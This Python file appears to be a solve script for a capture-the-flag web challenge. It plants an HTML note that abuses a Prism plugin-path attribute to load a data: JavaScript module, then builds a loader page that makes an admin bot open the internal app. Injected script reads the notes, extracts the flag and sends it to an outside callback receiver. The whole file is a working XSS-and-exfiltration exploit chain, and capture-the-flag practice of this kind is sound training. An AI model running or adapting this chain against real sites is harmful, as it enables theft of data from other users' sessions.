import base64
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path


ROOT = Path(__file__).resolve().parent
STAGE_BODY = (
    "<p data-prism-plugins data-prism-plugin-path="
    "data:text/javascript,import(name)#>"
)
FLAG_RE = re.compile(r"pwnsec\{[^}]+\}")


def load_endpoint(name: str) -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    return next(item["url"] for item in data["endpoints"] if item["name"] == name)


def request(url: str, *, data: bytes | None = None, headers: dict | None = None,
            timeout: float = 90):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    return urllib.request.urlopen(req, timeout=timeout)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def create_stage(app: str) -> str:
    form = urllib.parse.urlencode({"title": "stage", "body": STAGE_BODY}).encode()
    req = urllib.request.Request(
        app + "/notes",
        data=form,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Mode": "navigate",
        },
    )
    opener = urllib.request.build_opener(NoRedirect())
    try:
        opener.open(req, timeout=20)
    except urllib.error.HTTPError as exc:
        if exc.code != 302:
            raise
        return urllib.parse.urljoin(app + "/", exc.headers["Location"])
    raise RuntimeError("stage creation did not redirect")


def create_receiver(callback: str) -> str:
    with request(
        callback + "/token",
        data=b"{}",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=20,
    ) as response:
        return json.load(response)["uuid"]


def make_loader(stage_url: str, internal_app: str, callback: str, token: str,
                loader: str) -> str:
    stage_path = urllib.parse.urlsplit(stage_url).path
    internal_stage = internal_app.rstrip("/") + stage_path
    receiver = callback.rstrip("/") + "/" + token + "?flag="
    controller = (
        "let p;onmessage=e=>p=e.source;setTimeout(async()=>{"
        "for(let a of p.document.querySelectorAll(\"a[href^='/notes/']\")){"
        "let t=await(await fetch(a.pathname)).text(),"
        "f=t.match(/pwnsec\\{[^}]+}/);"
        f"if(f)location={json.dumps(receiver)}+encodeURIComponent(f[0])"
        "}},5000)"
    )
    module_url = "data:text/javascript," + urllib.parse.quote(controller, safe="")
    html = (
        f"<script>let w=open({json.dumps(internal_stage)},{json.dumps(module_url)});"
        "setTimeout(()=>w.postMessage(1,'*'),2000);"
        f"setTimeout(()=>location={json.dumps(internal_app.rstrip('/') + '/notes/')},3000)"
        "</script>"
    )
    encoded = base64.b64encode(html.encode()).decode()
    return loader.rstrip("/") + "/" + encoded


def visit(bot: str, loader_url: str) -> None:
    payload = json.dumps({"url": loader_url}).encode()
    deadline = time.monotonic() + 240
    while True:
        try:
            with request(
                bot.rstrip("/") + "/visit",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=80,
            ) as response:
                if response.status == 200:
                    return
        except urllib.error.HTTPError as exc:
            if exc.code not in (429, 500) or time.monotonic() >= deadline:
                raise
            reset = exc.headers.get("RateLimit-Reset") or exc.headers.get("Retry-After") or "5"
            time.sleep(min(max(int(reset), 2), 65))
            continue
        raise RuntimeError("bot did not accept the visit")


def read_flag(callback: str, token: str) -> str:
    api = callback.rstrip("/") + f"/token/{token}/requests?sorting=newest"
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        with request(api, timeout=20) as response:
            entries = json.load(response)["data"]
        for entry in entries:
            value = (entry.get("query") or {}).get("flag", "")
            match = FLAG_RE.fullmatch(value)
            if match:
                return match.group(0)
        time.sleep(1)
    raise RuntimeError("flag callback was not received")


def main() -> None:
    app = load_endpoint("app").rstrip("/")
    bot = load_endpoint("bot").rstrip("/")
    loader = load_endpoint("loader")
    callback = load_endpoint("callback").rstrip("/")
    stage_url = create_stage(app)
    token = create_receiver(callback)
    internal_app = load_endpoint("internal-app")
    loader_url = make_loader(stage_url, internal_app, callback, token, loader)
    visit(bot, loader_url)
    flag = read_flag(callback, token)
    sys.stdout.buffer.write(flag.encode("utf-8"))


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
